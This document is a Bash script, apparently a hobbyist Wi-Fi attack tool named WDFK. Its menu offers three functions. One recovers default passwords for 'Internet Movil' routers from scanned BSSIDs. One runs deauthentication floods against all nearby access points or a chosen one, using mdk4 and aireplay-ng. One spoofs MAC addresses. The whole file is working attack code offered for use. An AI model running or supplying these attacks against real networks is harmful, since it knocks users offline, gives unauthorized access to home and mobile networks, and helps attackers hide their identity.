#!/bin/bash

###########################
#     Authors             #
#   BY: N0OBIT4           #
#   BY: SN0KI             #
###########################

__github__="https://github.com/n0obit4"

#Colors
white="\033[1;37m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cafe="\033[0;33m"
blue="\033[1;34m"
transparent="\e[0m"


if [[ $EUID > 0 ]]; then # we can compare directly with this syntax.
  echo                -e "$white""##################################################################"
  echo -e "$yellow""#                 Please run as root/sudo                        # "
  echo -e "$red""#                    sudo bash WDFK.sh                           #""$transparent"
  echo                -e "$white""##################################################################""$transparent"
  exit 1
fi
clear

function menu(){

	echo
	echo
	echo -e "$red"    "                   ;              ,                                    "
	echo              "                   ED.            Et                                   "
	echo              "                   E#Wi           E#t      G:                          "
	echo              "                   E###G.         E##t     E#,    :                    "
	echo              "          ;        E#fD#W;        E#W#t    E#t  .GE           "
	echo              "        .DL        E#t t##L       E#tfL.   E#t j#K;         "
	echo              "f.     :K#L     LWLE#t  .E#K,     E#t      E#GK#f   "
	echo   -e "$red""EW:   ;W##L   .E#f E#t    j##f ,ffW#Dffj.  E##D.    "
	echo              "E#t  t#KE#L  ,W#;  E#t    :E#K: ;LW#ELLLf. E##Wi    "
	echo              "E#t f#D.L#L t#K:   E#t   t##L     E#t      E#jL#D:  "
	echo   -e "$red""E#jG#f  L#LL#G     E#t .D#W;      E#t      E#t ,K#j "
	echo              "E###;   L###j      E#tiW#G.       E#t      E#t   jD "
	echo              "E#K:    L#W;       E#K##i         E#t      j#t      "
	echo              "EG      LE.        E##D.          E#t       ,;      "
	echo              ";       ;@         E#t            ;#t               "
	echo              "                   L:              :;                                  "
	echo              "                                                    "
	echo     -e "$blue""Made by SN0KI and N0OBIT4"



	echo -e "$Cafe"" Choose an option""$transparent"
	echo ""

	echo -e "$blue" "1-Default Password, Internet Movil * XXXX."
	echo -e "$blue" "2-Wireless Deauth."
	echo -e "$blue" "3-MAC spoof."
	echo ""
	echo -e "$red""Exit (E)"
	echo ""
}

function list_interfaces(){

	#Show Avilable interfaces
	INTERFACES=`ls /sys/class/net/|grep  -v lo`

  	echo -e "$yellow""Availables interfaces: "
  	echo ""
  	echo -e "$green""$INTERFACES"
}


#################################################################################################
#																								#
#												INTERNET MOVIL 									#
#																								#
#################################################################################################

function internet_movil(){
  list_interfaces
  #chooce interface
  echo -ne "$white""Interfaz >> "
  read interface
  echo -e "$Purple""Waiting answer..."
  echo " "

  #Part 1: Scan all available wifi.
  iwlist $interface scan | grep -e 'ESSID*' -e 'Address*' > /tmp/allwireless

  #Part 2: Filtering by MAC
  cat /tmp/allwireless |grep Add* |sed 's/Cell 01 - Address://' | sed 's/Cell 02 - Address://'| sed 's/Cell 03 - Address://' | sed 's/Cell 04 - Address://' | sed 's/Cell 05 - Address://' | sed 's/Cell 06 - Address://' | sed 's/Cell 07 - Address://'| sed 's/Cell 08 - Address://' | sed s/' '/\/g  | sed s/':'/\/g >/tmp/pepito


  #Part 3: filtro 2.
  cat /tmp/pepito | sed 's/^.//g' |sed 's/^.//g' |sed 's/^.//g'|sed 's/^.//g' > /tmp/pepito2

  #ESSID filtering
  cat /tmp/allwireless |grep ESSID* > /tmp/name
  cat /tmp/name |grep ESSID* |sed 's/ESSID://' | sed 's/ESSID://' | sed 's/ESSID://' | sed 's/ESSID://' | sed 's/ESSID://' | sed s/' '/\/g  | sed s/':'/\/g >/tmp/name2

  echo -e "$blue" "ESSID: "
  cat -n /tmp/name2
  echo -e "$blue" "Password: "
  cat -n /tmp/pepito2
  echo " "
  echo -e "$yellow""Press any key to exit..."
  read option
  echo -e "$red""Coming out...""$transparent"
  sleep  1.5

}


#################################################################################################
#																								#
#												WIFI DEAUTH 									#
#																								#
#################################################################################################

function deauth(){

  list_interfaces
  echo ""
  echo -ne "$yellow""Choose interface: "
  read interface
  MON=$interface"mon"
  echo  -e "$Purple""Waiting answer...""$transparent"
  airmon-ng check kill &> /dev/null 
  airmon-ng start $interface &> /dev/null 
  clear
  echo "Scanning all Networks, press any key to continue..."
  read tecla
  echo "To break scan press CTRL + C"
  sleep 2
  clear
  airodump-ng $MON
  #Select attack
  echo ""
  echo -e "$yellow""1- Deauth all AP"
  echo -e "$yellow""2- Deauth only one AP"
  echo ""
  echo -ne "$blue"">> "
  read deauth

  if [ "$deauth" = "1" ];then
  xterm -hold -T "Close windows to stop attack" -e mdk4 $MON d;echo -e "$yellow""Attack succesfully...";sleep 1;echo "Shutdowing monitor mode";airmon-ng stop $MON &> /dev/null ; echo "Restarting Networks services";service NetworkManager restart

  fi

  if [ "$deauth" = "2" ];then
  echo ""
  echo -ne "$yellow""AP BSSID: ""$transparent"
  read BSSID
  echo -ne "$yellow""AP Channel(CH): ""$transparent"
  read CH
  clear
  echo "Specific Scan,  press any key to continue..."
  read teclaa
  echo "To break scan press CTRL + C"
  sleep 2
  clear
  #Specific scan
  airodump-ng $MON --bssid $BSSID --channel $CH
  echo -ne "$yellow""Deauth Packets(0 to infinite): "
  read deauth
  clear
  xterm -hold -T "Close windows to stop attack" -e aireplay-ng --deauth $deauth -a $BSSID $MON;echo -e "$yellow""Attack succesfully...";sleep 1;echo "Shutdowing monitor mode";airmon-ng stop $MON &> /dev/null ; echo "Restarting Networks services";service NetworkManager restart
  echo " "
  echo -e "$blue""thank... ;)""$transparent"
  fi

}

#################################################################################################
#																							                                                	#
#												MAC ADDRESS 									                                          #
#																							                                                 	#
#################################################################################################
function random(){
  
  list_interfaces
  echo ""
  echo -ne "$yellow""Choose interface: "
  read interface

  ifconfig $interface down

  macchanger -a $interface

  ifconfig $interface up

}

function static(){
  list_interfaces
  echo ""
  echo -ne "$yellow""Choose interface: "
  read interface
  echo ""
  echo -e "$yellow""Example: FF:FF:FF:FF:FF:FF"
  	echo -ne "$yellow""MAC address: "
  	read mac
  	if [ ${#mac} == "17" ];then
	    ifconfig $interface down

	    macchanger -m $mac $interface

	    ifconfig $interface up

	    echo -e "$yellow""Waiting..."

	    sleep 1

	    ifconfig $interface down

	    macchanger -m $mac $interface

	    ifconfig $interface up

	    echo -e "$green""Sucessfull""$transparent"
	elif [ ${#mac} != "17" ]; then
		echo -e "$red""Mac address error"
		echo ""
		spoof_mac
	fi

}

function restore_mac(){
  list_interfaces
  echo ""
  echo -ne "$yellow""Choose interface: "
  read interface
  echo ""
  ifconfig $interface down
  macchanger -p $interface
  ifconfig $interface up


}

function spoof_mac(){
  echo ""
  echo -e "$red""[""$yellow""1""$red""]""$yellow""Random Mac"
  echo ""
  echo -e "$red""[""$yellow""2""$red""]""$yellow""Specific MAC"
  echo ""
  echo -e "$red""[""$yellow""3""$red""]""$yellow""Restore MAC"
  echo ""
  echo -ne ">> " "$transparent"
  read inpt

  if [ "$inpt" == "1" ]
  then
  	random
  elif [ "$inpt" == "2" ]
  then
  	static
  elif [ "$inpt" == "3" ]
  then
  	restore_mac
  fi

}


#################################################################################################
#																								#
#												MAIN		 									#
#																								#
#################################################################################################

menu
echo -ne "$white"">> "
read  opcion

if [ "$opcion" == "1" ]
  then
	internet_movil

elif [ "$opcion" == "2" ]
  then
	deauth

elif [ "$opcion" == "3" ]
  then
	spoof_mac
elif [ "$opcion" = "E" ] || [ "$opcion" = "e" ]
  then
  echo -e "$red""Bye...""$transparent"
  sleep  1.5
  exit 1
else
  echo -e "$red""Incorrect Option"
  sleep 0.5
  exit 1
fi

